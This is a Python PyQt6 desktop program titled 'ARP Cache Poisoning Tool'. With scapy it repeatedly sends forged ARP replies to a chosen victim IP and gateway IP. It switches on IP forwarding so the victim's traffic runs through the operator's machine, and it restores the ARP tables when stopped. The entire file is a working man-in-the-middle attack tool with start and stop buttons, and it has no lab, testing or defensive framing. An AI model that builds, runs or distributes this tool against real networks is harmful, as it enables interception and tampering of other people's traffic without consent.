import sys
import os
import time
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from scapy.all import ARP, sr1, send
def is_admin():
    return os.geteuid() == 0


def get_mac(ip):
    ans = sr1(ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans.hwsrc
    else:
        return None


def spoof(victim_ip, spoof_ip):
    victim_mac = get_mac(victim_ip)
    if victim_mac is None:
        return False
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    return True


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                      psrc=src_ip, hwsrc=src_mac)
        send(packet, count=5, verbose=False)


class ARPWorker(QThread):
    log = pyqtSignal(str)

    def __init__(self, victim_ip: str, gateway_ip: str, interval: float = 2.0):
        super().__init__()
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self._running = True

    def run(self):
        self.log.emit(f"Worker started: victim={self.victim_ip}, gateway={self.gateway_ip}")
        try:
            while self._running:
                ok1 = spoof(self.victim_ip, self.gateway_ip)
                ok2 = spoof(self.gateway_ip, self.victim_ip)
                if not ok1:
                    self.log.emit(f"Could not get MAC for victim {self.victim_ip}")
                if not ok2:
                    self.log.emit(f"Could not get MAC for gateway {self.gateway_ip}")
                time.sleep(self.interval)
        except Exception as e:
            self.log.emit(f"Worker error: {e}")
        finally:
            try:
                restore(self.victim_ip, self.gateway_ip)
                restore(self.gateway_ip, self.victim_ip)
                self.log.emit("Restored ARP tables on stop")
            except Exception as e:
                self.log.emit(f"Error while restoring: {e}")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ARP Cache Poisoning Tool")
        self.setMinimumSize(500, 400)
        self.worker = None


        central = QWidget()
        layout = QVBoxLayout(central)
        self.setCentralWidget(central)


        row1 = QHBoxLayout()
        row1.addWidget(QLabel("Victim IP:"))
        self.input1 = QLineEdit()
        row1.addWidget(self.input1)
        layout.addLayout(row1)


        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Gateway IP:"))
        self.input2 = QLineEdit()
        row2.addWidget(self.input2)
        layout.addLayout(row2)


        btn_row = QHBoxLayout()

        self.btn1 = QPushButton("Begin Poisoning")
        self.btn1.clicked.connect(self.run_function_1)
        btn_row.addWidget(self.btn1)

        self.btn2 = QPushButton("Stop Poisoning")
        self.btn2.clicked.connect(self.run_function_2)
        btn_row.addWidget(self.btn2)

        layout.addLayout(btn_row)

        layout.addWidget(QLabel("Output:"))
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

    def run_function_1(self):
        val1 = self.input1.text().strip()
        val2 = self.input2.text().strip()
        if not is_admin():
            self.print_output("Tool needs to run as root/admin.")
            return
        if not val1 or not val2:
            self.print_output("Please enter both Victim IP and Gateway IP before starting.")
            return
        if self.worker is not None and self.worker.isRunning():
            self.print_output("Poisoning already running")
            return

        self.worker = ARPWorker(val1, val2)
        self.worker.log.connect(self.print_output)
        self.input1.setEnabled(False)
        self.input2.setEnabled(False)
        self.btn1.setEnabled(False)
        self.btn2.setEnabled(True)
        self.print_output(f"Starting poisoning: victim={val1}, gateway={val2}")
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
        self.worker.start()


    def run_function_2(self):
        if self.worker is None:
            self.print_output("Poisoning not running")
            return

        self.print_output("Stopping poisoning...")
        try:
            self.worker._running = False
            self.worker.wait(5000)
        except Exception as e:
            self.print_output(f"Error stopping worker: {e}")
        finally:
            self.worker = None
            self.input1.setEnabled(True)
            self.input2.setEnabled(True)
            self.btn1.setEnabled(True)
            self.btn2.setEnabled(False)
            self.print_output("Poisoning stopped")


    def print_output(self, message):
        self.output.append(message)
        self.output.append("")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())

